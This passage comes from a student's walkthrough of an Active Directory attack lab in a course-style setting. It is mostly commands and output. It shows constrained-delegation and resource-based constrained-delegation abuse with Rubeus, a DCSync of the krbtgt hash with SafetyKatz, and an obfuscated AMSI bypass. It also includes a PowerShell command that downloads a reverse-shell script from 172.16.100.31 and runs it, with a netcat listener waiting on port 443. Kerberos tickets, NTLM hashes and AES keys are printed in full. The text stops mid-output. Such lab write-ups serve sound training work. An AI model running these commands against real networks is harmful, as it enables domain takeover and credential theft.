 Volume Serial Number is 76D3-EB93

 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$

05/08/2021  01:15 AM    <DIR>          PerfLogs
11/14/2022  05:44 AM    <DIR>          Program Files
11/14/2022  05:43 AM    <DIR>          Program Files (x86)
12/03/2023  07:36 AM    <DIR>          Transcripts
11/15/2022  02:48 AM    <DIR>          Users
10/25/2024  04:29 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,431,602,688 bytes free
```

### For the next task, enumerate the computer accounts with constrained delegation enabled using PowerView

* PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth

```
pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 106
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 9/23/2025 5:02:28 AM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 9/23/2025 12:02:28 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 346339
lastlogon                     : 9/28/2025 11:02:56 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local
```

### Abuse Constrained Delegation using dcorp-adminsrv with Rubeus
We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. 
Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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
      cC1hZG1pbnNydiQ=

[*] Impersonating user 'Administrator' to target SPN 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL':

      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
[+] Ticket successfully imported!
```

### Run the below command to abuse the LDAP ticket

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

```
mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!
```

### Learning Objective 17:
```
• Find a computer object in dcorp domain where we have Write permissions. 
• Abuse the Write permissions to access that computer as Domain Admin.
```

Let's use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised. 
After trying from multiple users or using BloodHound we would know that the user ciadmin has Write permissions on the computer object of dcorp-mgmt.

* C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
```

Recall that we compromised ciadmin from dcorp-ci. 
We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci. 
Let's use the reverse shell that we have and load PowerView there.

* C:\Users\student1> cls

* powershell.exe iex (iwr http://172.16.100.31/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.31 -Port 443

* C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```
listening on [any] 443 ...
172.16.3.11: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.31] from (UNKNOWN) [172.16.3.11] 56838: NO_DATA
Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
```
* PS C:\Users\Administrator\.jenkins\workspace\Project0> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)

* Bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

* PS C:\Users\Administrator\.jenkins\workspace\Project0> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.31/PowerView.ps1'))

Now, configure RBCD on dcorp-mgmt for the student VMs. 
You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD
* C:\Users\student731>hostname
```
dcorp-std731
```

* PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std731$' -Verbose

### Check if RBCD is set correctly

* PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-DomainRBCD
```
SourceName                 : DCORP-MGMT$
SourceType                 : MACHINE_ACCOUNT
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
DelegatedName              : DCORP-STD731$
DelegatedType              : MACHINE_ACCOUNT
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-20691
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-STD731,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local

```

Get AES keys of your student VM (as we configured RBCD for it above). Run the below command from 
an elevated shell.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```
Authentication Id : 0 ; 27425 (00000000:00006b21)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/29/2025 10:17:55 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-STD731$
         * Domain   : dollarcorp.moneycorp.local
         * Password : .dy8C1``'!l]DSk#D5%R 6-'Hh+HDyg!0Fp[RD<P9-p#CFM@`pmq%HLM9Ta^dXJefzvyG50&VnY\_C#8(@f*F>y(*]d+,8?VZ!^<\E_Pe;n`lc0mo0MU]wca
         * Key List :
           aes256_hmac       6ea583276ca6036d6b0b2431f6f84e37d93bd4d3fd78b5f833fd7a20f947c90d
           aes128_hmac       97c9f95ab60f0012a588fbea394179ca
           rc4_hmac_nt       734a4edac0d591080d63e0682259bd0c
           rc4_hmac_old      734a4edac0d591080d63e0682259bd0c
           rc4_md4           734a4edac0d591080d63e0682259bd0c
           rc4_hmac_nt_exp   734a4edac0d591080d63e0682259bd0c
           rc4_hmac_old_exp  734a4edac0d591080d63e0682259bd0c

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STD731$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 9/29/2025 10:17:54 AM
SID               : S-1-5-18

         * Username : dcorp-std731$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c
           rc4_hmac_nt       734a4edac0d591080d63e0682259bd0c
           rc4_hmac_old      734a4edac0d591080d63e0682259bd0c
           rc4_md4           734a4edac0d591080d63e0682259bd0c
           rc4_hmac_nt_exp   734a4edac0d591080d63e0682259bd0c
           rc4_hmac_old_exp  734a4edac0d591080d63e0682259bd0c

mimikatz(commandline) # exit
Bye!

```

### With Rubeus, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator.

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:DCORP-STD731$ /aes256:7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt

```
[snip]
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : s4u /user:DCORP-STD731$ /aes256:7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 7a27508c61e5952b643bb78ecdefee61a8a0a4ba4a30cbf7416825c5be26d37c
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\DCORP-STD731$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGMjCCBi6gAwIBBaEDAgEWooIFFjCCBRJhggUOMIIFCqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BLIwggSuoAMCARKhAwIBAqKCBKAEggScxVePnLoCWrrfN3XPSC+MbW9byYXnjroAQiLPO8+rD4eMKg05
